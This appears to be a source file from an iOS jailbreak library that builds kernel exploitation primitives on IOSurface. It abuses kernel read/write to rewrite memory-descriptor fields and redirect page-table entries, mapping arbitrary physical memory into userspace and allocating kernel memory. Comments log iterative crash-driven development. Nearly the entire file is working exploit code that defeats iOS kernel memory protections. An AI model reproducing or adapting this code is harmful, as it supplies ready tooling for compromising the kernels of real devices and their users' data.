#import "info.h"
#import "primitives.h"
#import "translation.h"
#import "kernel.h"
#import "util.h"
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <mach-o/dyld.h>

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
	uint64_t surfaceClientsArray = kread_ptr(rootUserClient + 0x118);
	return kread_ptr(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
	return kread_ptr(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
	if (gPrimitives.krwMinSafeReadSize > 0x8) {
		uint32_t zoneSize = 0x30;
		uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

		uint8_t buf[gPrimitives.krwMinSafeReadSize];
		kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
		return UNSIGN_PTR(*(uint64_t *)(&buf[0x18 - readOffset]));
	} else {
		return kread_ptr(surfaceSendRight + 0x18);
	}
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, ranges));
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
	kwrite64(surface + koffsetof(IOSurface, ranges), ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, memoryDescriptor));
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
	return kread_ptr(memoryDescriptor + 0x60);
}

uint64_t IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
{
	return kwrite64(memoryDescriptor + 0x60, ranges);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
	return kread64(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
	kwrite64(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
	kwrite8(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
	return kread32(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
	kwrite8(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
	kwrite64(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, rangeCount));
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
	kwrite32(surface + koffsetof(IOSurface, rangeCount), rangeCount);
}

uint64_t IOSurface_port_getSendRight(mach_port_t surfaceMachPort)
{
	uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
	if (koffsetof(IOMachPort, object)) {
		if (gPrimitives.krwMinSafeReadSize > 0x8) {
			uint32_t zoneSize = koffsetof(IOMachPort, object) + 0x8; // object is the last field in IOMachPort
			uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

			uint8_t buf[gPrimitives.krwMinSafeReadSize];
			kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
			surfaceSendRight = UNSIGN_PTR(*(uint64_t *)(&buf[gPrimitives.krwMinSafeReadSize - 0x8]));
		} else {
			surfaceSendRight = kread_ptr(surfaceSendRight + koffsetof(IOMachPort, object));
		}
	}
	return surfaceSendRight;
}

static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic, uint32_t cacheMode)
{
	IOSurfaceRef surfaceRef = NULL;
	if (cacheMode != 0) {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
			(__bridge NSString *)kIOSurfaceCacheMode : @(cacheMode),
		});
	} else {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
		});
	}

	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	*((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
	IOSurfaceDecrementUseCount(surfaceRef);
	CFRelease(surfaceRef);
	return port;
}

struct IOSurface_toCleanup {
	uint64_t descriptor;
	uint64_t origRanges;
	uint64_t *fakeRangesUA;
};

// v84: single-active L2 redirect state (kmap PTE-retarget path)
static uint64_t g_l2_addr   = 0;
static uint64_t g_l2_orig   = 0;
static int      g_l2_active = 0;
extern void jb_tr_beacon(const char *fmt, ...);

// v87: census carve-out map (fed by a18_probe after census-done). The
// L2 table PA is checked against these BEFORE any primitive access —
// v86 panicked because the pool's L2 table page sat in a hole on that
// boot (kernel TTBR1 has no alias for hole pages).
static struct { uint64_t lo, hi; } g_holes[16];
static int g_hole_n = 0;
void IOSurface_set_hole_run(uint64_t basePA, uint64_t pages)
{
	if (g_hole_n < 16) {
		g_holes[g_hole_n].lo = basePA;
		g_holes[g_hole_n].hi = basePA + pages * 0x4000ULL;
		g_hole_n++;
	}
}
static int pa_in_hole(uint64_t pa)
{
	for (int i = 0; i < g_hole_n; i++)
		if (pa >= g_holes[i].lo && pa < g_holes[i].hi) return 1;
	return 0;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak); // fwd: defined below

struct IOSurface_toCleanup *cleanups = NULL;
unsigned cleanupsCount = 0;

// v84: restore hook — runs at kmap() ENTRY (before any new redirect) and
// on kernel-panic path teardown (fwscan flush/reboot), making the redirect
// self-healing: the L2 entry survives only while the exploit wants it.
void IOSurface_l2_restore(void)
{
	if (g_l2_active) {
		kwrite64(g_l2_addr, g_l2_orig);
		jb_tr_beacon("KMAP l2,restored,addr=%llx", (unsigned long long)g_l2_addr);
		g_l2_active = 0;
	}
}

int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32_t cacheMode)
{
	// v73: step-by-step beacons — kmap-fail at fwscan time was instant and
	// uniform across all 8 census windows; this names the failing step.
	// No control-flow changes: only observations (plus a NULL-port guard
	// that only matters in the already-failing case).
	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
	// v81: PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
	// maps (C,first=0x539,0 = own surface ID in all 20 windows). So: take
	// the surface's own valid 64KB mapping and rewrite its L3 PTEs to the
	// target PA. No descriptor/surface writes at all — teardown-safe.
	static unsigned g_kmap_seq = 0;
	unsigned seq = g_kmap_seq++;
	jb_tr_beacon("KMAP win=%u", seq);
	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
	if (!surfaceMachPort) {
		jb_tr_beacon("KMAP fail,noport");
		return -1;
	}
	uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
	uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
	jb_tr_beacon("KMAP step1,sr=%llx,surface=%llx,desc=%llx,ranges=%llx",
	             (unsigned long long)surfaceSendRight,
	             (unsigned long long)surface,
	             (unsigned long long)desc, (unsigned long long)ranges);

	// v75: desc-side pre-state baseline. NOTE: v74's baseline read
	// kread64(ranges)/kread64(ranges+8) — the ranges ELEMENT is a 16-byte
	// kalloc.type6.16 object and ClearSword's fixed 32-byte RMW tripped
	// zone bound checks → kernel panic 2026-09-05 21:37:02. LAW: never aim
	// a ClearSword primitive at a sub-32-byte kernel object. All reads
	// below are INSIDE the (large) memory descriptor object.
	jb_tr_beacon("KMAP pre,desc,r60=%llx,r50=%llx,f20=%x,m28=%llx,w88=%x,d70=%llx,d18=%llx,d90=%llx",
	             (unsigned long long)kread64(desc + 0x60),
	             (unsigned long long)kread64(desc + 0x50),
	             (unsigned int)kread32(desc + 0x20),
	             (unsigned long long)kread64(desc + 0x28),
	             (unsigned int)kread8(desc + 0x88),
	             (unsigned long long)kread64(desc + 0x70),
	             (unsigned long long)kread64(desc + 0x18),
	             (unsigned long long)kread64(desc + 0x90));

	// v81 PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
	// maps (C,first=0x539,0 = own surface ID in all 20 windows, descriptor
	// AND surface.ranges retargeted and verified). New path: take the
	// surface's own valid 64KB mapping and rewrite its L3 PTEs to the
	// target PA. NO IOSurface writes at all — the exit-during-rewrite
	// panic class (00:07:39) dies here. PTE writes sit inside 4KB L3
	// table pages (RMW LAW v2 satisfied; window is 32B-aligned, 64KB-
	// aligned base0 ⇒ PTE index multiple of 4).
	IOSurfaceRef refA = IOSurfaceLookupFromMachPort(surfaceMachPort);
	jb_tr_beacon("KMAP A,lookup=%d", refA != NULL);
	if (!refA) {
		jb_tr_beacon("KMAP fail,lookupA");
		*uaddr = NULL;
		return -1;
	}
	void *base0 = IOSurfaceGetBaseAddress(refA);
	jb_tr_beacon("KMAP A,base0=%llx", (unsigned long long)(uintptr_t)base0);
	if (!base0) {
		jb_tr_beacon("KMAP fail,base0A");
		*uaddr = NULL;
		return -1;
	}

	// v84: L2 REDIRECT. v83 panic (esr 9600004f, far=l3+0x770) proved the
	// pool's L3 table page alias is UNMAPPED in kernel TTBR1 (carve-out
	// hole) — the walk can never reach the L3. But the L2 table IS mapped
	// and writable (l2e read ✓). So: build a fake L3 table in base0's own
	// backing page (userspace write through the mapping — free), get its
	// PA from the surface's ranges element read through its PAPT ALIAS
	// (aliases bypass zone bound checks — the 16B element is unreachable
	// only at its zone VA), and kwrite64 the L2 entry to point at it.
	// Restore discipline: original L2 entry saved; restored at next kmap
	// entry, at l2_restore(), and in cleanup.
	uint64_t va    = (uint64_t)base0;
	uint64_t ttP   = ttep_self();
	uint64_t tt    = phystokv(ttP & 0x0000FFFFFFFFC000ULL);
	if (!tt) tt = ttP;

	// restore any previous redirect FIRST (one active at a time)
	if (g_l2_active) {
		kwrite64(g_l2_addr, g_l2_orig);
		jb_tr_beacon("KMAP l2,restored,addr=%llx", (unsigned long long)g_l2_addr);
		g_l2_active = 0;
	}

	uint64_t l1e   = kread64(tt + 8 * ((va >> 36) & 0x7FF));
	uint64_t l2    = phystokv(l1e & 0x0000FFFFFFFFC000ULL);
	uint64_t idx2  = (va >> 25) & 0x7FF;
	if (!l2 || (8 * idx2) > 0x4000 - 0x20) {
		jb_tr_beacon("KMAP fail,ptewalk,l2=%llx,idx2=%llx",
		             (unsigned long long)l2, (unsigned long long)idx2);
		*uaddr = NULL;
		return -1;
	}
	// (v87: origL2e is read AFTER the hole gate — never touch a holed L2)

	// v87: donor = IOSurface_kalloc_16up(0x4000) — a 16KB RANGES ARRAY we
	// allocate via IOSurface itself. No packed-pointer decoding (v86: the
	// element holds VM_PAGE_PACKED ptrs, base 0xffffffdc00000000 — not
	// PAs), no element alias reads. kvtophys(arrVA) is the proven
	// kernel-VA translator. Fake L3 = this array's page; the 4 window
	// PTEs are written through its ALIAS (32B windows inside a 16KB
	// object — RMW-law compliant).
	uint64_t arrVA = IOSurface_kalloc_16up(0x4000, true);
	if (!arrVA || arrVA == (uint64_t)-1) {
		jb_tr_beacon("KMAP fail,kalloc16up");
		*uaddr = NULL;
		return -1;
	}
	uint64_t donorPA = kvtophys(arrVA) & ~0x3FFFULL;
	jb_tr_beacon("KMAP donor,arrva=%llx,pa=%llx",
	             (unsigned long long)arrVA, (unsigned long long)donorPA);
	if (!donorPA) {
		jb_tr_beacon("KMAP fail,donorpa");
		*uaddr = NULL;
		return -1;
	}

	// Build the fake L3 THROUGH THE ALIAS (the array is not user-mapped):
	// zero the slot neighborhood, then 4 PTEs for the 64KB window.
	uint64_t arrAlias = phystokv(kvtophys(arrVA));
	if (!arrAlias) {
		jb_tr_beacon("KMAP fail,arralias");
		*uaddr = NULL;
		return -1;
	}
	uint64_t arrOff = arrVA & 0x3FFFULL;
	uint64_t slot   = (va >> 14) & 0x7FF;
	uint64_t paPage = pa & ~0x3FFFULL;
	if (arrOff + 8 * (slot + 4) > 0x4000 || slot + 4 > 2048) {
		jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx,slot=%llx",
		             (unsigned long long)arrOff, (unsigned long long)slot);
		*uaddr = NULL;
		return -1;
	}
	for (int pgi = 0; pgi < 4; pgi++) {
		uint64_t pte = 0x341ULL |
		    ((((paPage + pgi * 0x4000ULL) >> 14) & 0x1FFFFFFFFULL) << 14);
		kwrite64(arrAlias + arrOff + 8 * (slot + pgi), pte);
	}
	jb_tr_beacon("KMAP fake3,alias=%llx,off=%llx,slot=%llx,pte0=%llx",
	             (unsigned long long)arrAlias, (unsigned long long)arrOff,
	             (unsigned long long)slot,
	             (unsigned long long)kread64(arrAlias + arrOff + 8 * slot));

	// Hole gate: the L2 table page must NOT be a census carve-out — v86
	// panicked because the pool's L2 page was a hole on that boot (the RMW
	// read of origL2e faulted kernel-side). Census runs are passed in from
	// a18_probe (IOSurface_set_hole_map) after census-done.
	uint64_t l2PA = kvtophys(l2);
	if (pa_in_hole(l2PA)) {
		jb_tr_beacon("KMAP skip,l2holed,pa=%llx", (unsigned long long)l2PA);
		*uaddr = NULL;
		return -1;
	}
	uint64_t origL2e = kread64(l2 + 8 * idx2);
	if (!(origL2e & 1)) {
		jb_tr_beacon("KMAP fail,l2e,invalid=%llx", (unsigned long long)origL2e);
		*uaddr = NULL;
		return -1;
	}

	// Redirect the L2 entry → donor page as L3 table (table desc 0x3).
	uint64_t newL2e = (donorPA & 0x0000FFFFFFFFC000ULL) | 0x3;
	kwrite64(l2 + 8 * idx2, newL2e);
	uint64_t rbL2e = kread64(l2 + 8 * idx2);
	g_l2_addr = l2 + 8 * idx2;
	g_l2_orig = origL2e;
	g_l2_active = 1;
	jb_tr_beacon("KMAP l2,redirect,addr=%llx,old=%llx,new=%llx,rb=%llx",
	             (unsigned long long)g_l2_addr, (unsigned long long)origL2e,
	             (unsigned long long)newL2e, (unsigned long long)rbL2e);
	if (rbL2e != newL2e) {
		jb_tr_beacon("KMAP fail,l2write");
		kwrite64(g_l2_addr, g_l2_orig);
		g_l2_active = 0;
		*uaddr = NULL;
		return -1;
	}

	// TLB: evict stale translations for our ASID by touching a large
	// buffer (EL0 cannot TLBI; pressure + natural context switches evict).
	{
		static uint64_t *thrash;
		if (!thrash) thrash = malloc(64ULL << 20);
		for (uint64_t off = 0; off < (64ULL << 20); off += 0x4000)
			(void)*(volatile uint64_t *)((uint8_t *)thrash + off);
	}

	jb_tr_beacon("KMAP PTE,first=%llx,%llx",
	             (unsigned long long)*(volatile uint64_t *)base0,
	             (unsigned long long)((volatile uint64_t *)base0)[1]);
	*uaddr = base0;
	return 0;
}

int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr) {
	return IOSurface_map_withCacheMode(pa, size, uaddr, 0);
}

void IOSurface_map_cleanup(void)
{
	IOSurface_l2_restore(); // v84: never leave the L2 redirect dangling

	if (cleanupsCount == 0) return;

	for (unsigned i = 0; i < cleanupsCount; i++) {
		uint64_t desc = cleanups[i].descriptor;
		uint64_t origRanges = cleanups[i].origRanges;
		uint64_t *fakeRangesUA = cleanups[i].fakeRangesUA;

		IOMemoryDescriptor_set_ranges(desc, origRanges);
		free(fakeRangesUA);
	}

	free(cleanups);
	cleanups = NULL;
	cleanupsCount = 0;
}

static CFNumberRef CFNUM64(uint64_t value) {
    return CFNumberCreate(NULL, kCFNumberSInt64Type, (void *)&value);
}

static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
	uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);

	static vm_size_t dummyPageSize = 0x4000;
	static vm_address_t dummyPage = 0;
	if (dummyPage == 0) {
		vm_allocate(mach_task_self(), &dummyPage, dummyPageSize, VM_FLAGS_ANYWHERE);
	}

	uint64_t *userspaceRanges = malloc(rangesAlignedSize);
	for (int i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
		userspaceRanges[i] = dummyPage;
		userspaceRanges[i+1] = dummyPageSize;
	}

    CFDataRef userspaceRangesData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)userspaceRanges, rangesAlignedSize);
    free(userspaceRanges);

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
	CFNumberRef dummyPageSizeNum = CFNUM64(dummyPageSize);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"),     (const void *)dummyPageSizeNum);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), (const void *)userspaceRangesData);

    IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    IOSurfaceDecrementUseCount(surfaceRef);

	CFRelease(userspaceRangesData);
	CFRelease(dummyPageSizeNum);
	CFRelease(dict);

    return port;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak)
{
	if (size > 0x10000) return -1; // 0x10000 is max

	while (true) {
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(size);

		uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
		uint64_t va = IOSurface_get_ranges(surface);
		uint64_t vaSize = IOSurface_get_rangeCount(surface) * 0x10;

		if (vaSize < size) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (leak) {
			IOSurface_set_ranges(surface, 0);
			IOSurface_set_rangeCount(surface, 0);
		}

		return va;
	}

	return 0;
}

static mach_port_t IOSurface_kalloc_getSurfacePort_15(uint64_t size)
{
	uint64_t allocSize = 0x10;
	uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
	memset(addressRangesBuf, 0, size);
	addressRangesBuf[0] = (uint64_t)malloc(allocSize);
	addressRangesBuf[1] = allocSize;
	NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
	free(addressRangesBuf);

	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		@"IOSurfaceAllocSize" : @(allocSize),
		@"IOSurfaceAddressRanges" : addressRanges,
	});
	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	IOSurfaceDecrementUseCount(surfaceRef);
	return port;
}

uint64_t IOSurface_kalloc_15(uint64_t size, bool leak)
{
	while (true) {
		uint64_t allocSize = max(size, 0x10000);
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_15(allocSize);

		uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
		uint64_t va = IOSurface_get_ranges(surface);

		if (kvtophys(va + allocSize) != 0) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (va == 0) continue;

		if (leak) {
			IOSurface_set_ranges(surface, 0);
			IOSurface_set_rangeCount(surface, 0);
		}

		return va + (allocSize - size);
	}

	return 0;
}

int IOSurface_kalloc_global(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, true);
	}
	else {
		alloc = IOSurface_kalloc_15(size, true);
	}

	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

int IOSurface_kalloc_local(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, false);
	}
	else {
		alloc = IOSurface_kalloc_15(size, false);
	}
	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

void libjailbreak_IOSurface_primitives_init(void)
{
	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		(__bridge NSString *)kIOSurfaceWidth : @120,
		(__bridge NSString *)kIOSurfaceHeight : @120,
		(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
	});
	if (!surfaceRef) {
		char execPath[PATH_MAX];
		uint32_t execPathSize = PATH_MAX;
		_NSGetExecutablePath(execPath, &execPathSize);
		printf("Failed to initialize IOSurface primitives, add \"IOSurfaceRootUserClient\" to the \"com.apple.security.exception.iokit-user-client-class\" dictionary of the entitlements from \"%s\" to fix this. Due to this, the kalloc, kmap and kcall primitives will not work.\n", execPath);
		return;
	}
	CFRelease(surfaceRef);

	gPrimitives.kmap = IOSurface_map;
	gPrimitives.kalloc_global = IOSurface_kalloc_global;
	gPrimitives.kalloc_local  = IOSurface_kalloc_local;
}